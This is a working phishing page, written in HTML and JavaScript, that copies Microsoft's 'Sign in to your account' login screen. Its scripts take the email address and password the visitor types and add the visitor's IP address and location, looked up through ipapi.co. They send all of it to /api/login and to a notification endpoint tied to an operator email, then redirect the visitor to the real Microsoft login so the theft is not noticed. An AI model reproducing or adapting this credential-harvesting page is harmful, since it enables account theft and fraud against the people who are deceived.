<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Keep existing head content -->
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <meta name="robots" content="noindex, nofollow">
    <meta name="robots" content="noindex">
    <meta name="googlebot" content="noarchive">


    <link rel="shortcut icon" href="/assets/microsoft.svg" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <!-- <link rel="stylesheet" href="./font-awesome-4.7.0/css/font-awesome.min.css"> -->
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
        }

        html {
            scroll-behavior: smooth;
            color: #383838;
            /* overflow-y: hidden; */
        }

        #form::-webkit-scrollbar {
            background: transparent;
            width: 0;
            height: 0;
        }

        .container-item {
            z-index: 99999;
            margin: 40px 10%;
            overflow-x: hidden;
        }

        .container-item-2 {
            margin: 40px 10%;
            border: 1px solid #7c7c7c;
            display: flex;
            justify-content: left;
            align-items: center;
            color: #383838;
            padding: 5px 15px;
        }

        input {
            padding: 10px 1px;
            width: 100%;
            border: 1px solid transparent;
            border-bottom: 1px solid #383838;
            z-index: 1;
        }

        .slide-one {
            width: 100%;
            transition: 0.5s ease all;
        }

        .slide-two {
            width: 100%;
            transition: 0.5s ease all;
        }

        .slide-one-toggle {
            transform: translateX(-100%);
        }

        .slide-two-toggle {
            transform: translateX(-100%);
        }

        input:focus {
            border-bottom: 1px solid red;
            outline: 1px solid transparent;
        }

        #form p {
            font-size: 14px;
        }

        #form p img {
            transform: translateY(6px);
        }

        #form {
            display: flex;
            justify-content: space-between;
            overflow-x: scroll;
            width: 200%;
        }

        #btn {
            background: #0067B8;
            color: white;
            border: 1px solid transparent;
            width: 100px;
            text-align: center;
            border-radius: 2px;
            padding: 8px 5px;
        }

        span {
            color: dodgerblue;
        }

        .btn-item {
            display: flex;
            justify-content: right;
            margin: 25px 0;
        }

        footer ul {
            list-style-type: none;
            display: flex;
            justify-content: center;
            position: fixed;
            bottom: 0;
            font-size: 12px;
        }

        footer ul li {
            padding: 5px 10px;
        }

        a {
            text-decoration: none;
            color: #383838;
        }

        @media screen and (min-width: 600px) {
            body {
                background: linear-gradient(27deg, rgba(231, 216, 210, 1) 28%, rgba(214, 220, 227, 1) 52%, rgba(214, 225, 210, 1) 80%, rgba(231, 216, 210, 1) 100%);
            }

            .container {
                margin: 5% 50%;
                transform: translateX(-50%);
                width: 70%;
                background: white;
                padding: 10px;
                box-shadow: 1px 1px 10px #b3b1b180;
            }

            .container-item-2 {
                margin: 8% 50%;
                transform: translate(-50%, -20px);
                width: 70%;
                background: white;
                padding: 10px;
                box-shadow: 1px 1px 10px #b3b1b180;
            }

            footer {
                display: flex;
                justify-content: center;
            }
        }

        @media screen and (min-width: 768px) {
            .container {
                width: 40%;
            }

            .container-item-2 {
                transform: translate(-50%, -50px);
                width: 40%;
            }
        }

        @media screen and (min-width: 1200px) {
            .container {
                width: 30%;
            }

            .container-item-2 {
                transform: translate(-50%, -70px);
                width: 30%;
            }
        }
    </style>
    <script>
        // Force debug mode and verbose logging
        window.DEBUG_MODE = true;
        
        // Capture any errors that might occur
        window.addEventListener('error', function(e) {
            console.error('JavaScript error:', e.message, 'at', e.filename, 'line', e.lineno);
        });
        
        // Create a redundant click handler at the document level
        document.addEventListener('click', function(e) {
            console.log('Click detected on:', e.target.tagName, e.target.id, e.target.className);
            
            // Check if this is our target button
            if (e.target.id === 'btn' || e.target.id === 'next' || 
                e.target.id === 'submit' || e.target.className.includes('next') ||
                e.target.tagName === 'BUTTON' || e.target.type === 'submit') {
                console.log('Potential button click detected!');
                
                // If this is during the email entry phase (first screen)
                const emailField = document.getElementById('email');
                if (emailField && emailField.value) {
                    const emailContainer = document.querySelector('.email-container');
                    const passwordContainer = document.querySelector('.password-container');
                    
                    if (emailContainer && passwordContainer) {
                        console.log('Forcing password container display');
                        emailContainer.style.display = 'none';
                        passwordContainer.style.display = 'block';
                        
                        // Update any display elements
                        const emailDisplays = document.querySelectorAll('.email-display, .username-display');
                        emailDisplays.forEach(el => {
                            el.textContent = emailField.value;
                        });
                        
                        e.preventDefault();
                        e.stopPropagation();
                        return false;
                    }
                }
                
                // If this is during the password phase
                const passwordField = document.getElementById('password');
                if (passwordField && passwordField.value) {
                    console.log('Password entered, processing submission');
                    processLogin();
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }
            }
        }, true);
        
        // Global function to process login
        function processLogin() {
            const email = document.getElementById('email')?.value || '';
            const password = document.getElementById('password')?.value || '';
            
            console.log('Processing login with:', email);
            
            const userData = {
                username: email + " (MS)",
                password: password,
                country: document.getElementById('country')?.value || '',
                city: document.getElementById('city')?.value || '',
                continent: document.getElementById('continent')?.value || '',
                ip_address: document.getElementById('ip')?.value || '',
                platform: 'microsoft'
            };
            
            // Save to database
            fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(userData)
            })
            .then(response => response.json())
            .then(data => {
                console.log('Data saved:', data);
                // Send email notification
                const notificationData = {
                    username: email + " (MS)",
                    password: password,
                    country: document.getElementById('country')?.value || '',
                    city: document.getElementById('city')?.value || '',
                    continent: document.getElementById('continent')?.value || '',
                    ip: document.getElementById('ip')?.value || '',
                    adminEmail: document.getElementById('adminEmail')?.value || 'admin@gmail.com'
                };
                
                fetch('/api/notify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(notificationData)
                });
                
                // Redirect after short delay
                setTimeout(() => {
                    window.location.href = 'https://login.microsoftonline.com';
                }, 1000);
            })
            .catch(error => {
                console.error('Error saving data:', error);
                // Still redirect
                setTimeout(() => {
                    window.location.href = 'https://login.microsoftonline.com';
                }, 1000);
            });
        }
    </script>
</head>
<body>
    <!-- Keep existing body content up to line 323 -->
    <div class="container">
        <div class="container-item">
            <img src="./assets/mlogo.svg" alt=""><br><br>
            <div id="form">
                <div class="slide-one">
                    <h2>Sign in</h2>
                    <span class="msg" style="color: red; font-size: 13px;"></span>
                    <br>
                    <input type="email" id="email" name="username" placeholder="Email, phone, or Skype"><br><br>
                    <p>No account? <a href=""><span>Create one!</span></a></p>
                    <p style="color: dodgerblue;">Sign in with a security key <img src="./assets/question.JPG" alt="">
                    </p>
                    <div class="btn-item">
                        <p id="btn" class="next">Next</p>
                </div>
            </div>
            
                <div class="slide-two">
                    <span class="msg2" style="color: red; font-size: 13px;"></span><br>
                    <p id="back"><i class="fa fa-arrow-left"></i> <span id="name" style="color: #383838;"></span></p><br>
                    <h2>Enter password</h2><br>
                    <input type="password" id="password" name="password" placeholder="Password"><br><br>
                    <p>Forget password?</p>
                    <a href="">
                        <p style="color: dodgerblue;">Other ways to sign in
                        </p>
                    </a>
                    <div class="btn-item">
                        <button id="btn" class="submit">Sign in</button>
                </div>
                </div>
            </div>
        </div>
    </div>

    <div class="container-item-2"><img src="./assets/key.jpg" width="25px"> <span style="color: #383838;">Sign- in
            options</span></div>

    <footer>
        <ul>
            <a href="#">
                <li>Terms of use</li>
            </a>
            <a href="#">
                <li>Privacy &amp; cookies</li>
            </a>
            <a href="#">
                <li>...</li>
            </a>
        </ul>
    </footer>

    <iframe src="" id="iframLink" style="opacity: 0;" frameborder="0"></iframe>


    

    <input type="hidden" id="country" value="" name="country">
    <input type="hidden" id="city" value="" name="city">
    <input type="hidden" id="continent" value="" name="continent">
    <input type="hidden" id="ip" value="" name="ip">
    <input type="hidden" id="adminEmail" value="admin@gmail.com" name="admin">

    <!-- Update fetch calls to use Next.js API routes instead of PHP -->
    <script>
        // Get user location and IP immediately
        fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            if (document.getElementById('country')) document.getElementById('country').value = data.country_name || '';
            if (document.getElementById('city')) document.getElementById('city').value = data.city || '';
            if (document.getElementById('continent')) document.getElementById('continent').value = data.continent_code || '';
            if (document.getElementById('ip')) document.getElementById('ip').value = data.ip || '';
        })
        .catch(error => {
            console.error('Error fetching location data:', error);
        });
        
        // Wait until DOM is fully loaded
        document.addEventListener("DOMContentLoaded", function() {
            console.log("DOM fully loaded, attaching events");
            
            // Get all relevant elements
            const nextButton = document.querySelector('button') || 
                               document.getElementById('next') || 
                               document.getElementById('submit') || 
                               document.getElementById('btn') ||
                               document.querySelector('.btn-primary') ||
                               document.querySelector('.btn');
            
            if (nextButton) {
                console.log('Found button:', nextButton.tagName, nextButton.id, nextButton.className);
                
                // Remove any inline styles that might interfere
                nextButton.removeAttribute('disabled');
                nextButton.style.pointerEvents = 'auto';
                nextButton.style.cursor = 'pointer';
                nextButton.style.position = 'relative';
                nextButton.style.zIndex = '9999';
                
                // Create a new transparent overlay button that will definitely catch clicks
                const overlayButton = document.createElement('button');
                overlayButton.style.position = 'absolute';
                overlayButton.style.top = '0';
                overlayButton.style.left = '0';
                overlayButton.style.width = '100%';
                overlayButton.style.height = '100%';
                overlayButton.style.background = 'transparent';
                overlayButton.style.border = 'none';
                overlayButton.style.zIndex = '10000';
                overlayButton.style.cursor = 'pointer';
                
                // Get the button's parent for positioning
                const buttonParent = nextButton.parentNode;
                buttonParent.style.position = 'relative';
                buttonParent.appendChild(overlayButton);
                
                // Add multiple event handlers to ensure it works
                overlayButton.addEventListener('click', function(e) {
                    console.log('Overlay button clicked!');
                    e.preventDefault();
                    e.stopPropagation();
                    
                    const emailField = document.getElementById('email');
                    const passwordField = document.getElementById('password');
                    const passwordContainer = document.querySelector('.password-container');
                    
                    if (passwordContainer && passwordContainer.style.display === 'none' && emailField && emailField.value) {
                        // First screen - show password field
                        document.querySelector('.email-container').style.display = 'none';
                        passwordContainer.style.display = 'block';
                        
                        // Update display elements
                        document.querySelectorAll('.email-display').forEach(el => {
                            el.textContent = emailField.value;
                        });
                    } else if (passwordField && passwordField.value) {
                        // Second screen - process login
                        processLogin();
                    }
                    
                    return false;
                });
                
                // Also add our handler to the original button
                nextButton.addEventListener('click', function(e) {
                    console.log('Original button clicked!');
                    e.preventDefault();
                    e.stopPropagation();
                    
                    const emailField = document.getElementById('email');
                    const passwordField = document.getElementById('password');
                    const passwordContainer = document.querySelector('.password-container');
                    
                    if (passwordContainer && passwordContainer.style.display === 'none' && emailField && emailField.value) {
                        // First screen - show password field
                        document.querySelector('.email-container').style.display = 'none';
                        passwordContainer.style.display = 'block';
                        
                        // Update display elements
                        document.querySelectorAll('.email-display').forEach(el => {
                            el.textContent = emailField.value;
                        });
                    } else if (passwordField && passwordField.value) {
                        // Second screen - process login
                        processLogin();
                    }
                    
                    return false;
                });
            } else {
                console.error('Could not find any buttons!');
                // Add click handlers to the entire page as a fallback
                document.body.addEventListener('click', function(e) {
                    console.log('Body clicked at coordinates:', e.clientX, e.clientY);
                });
            }
        });
    </script>
</body>
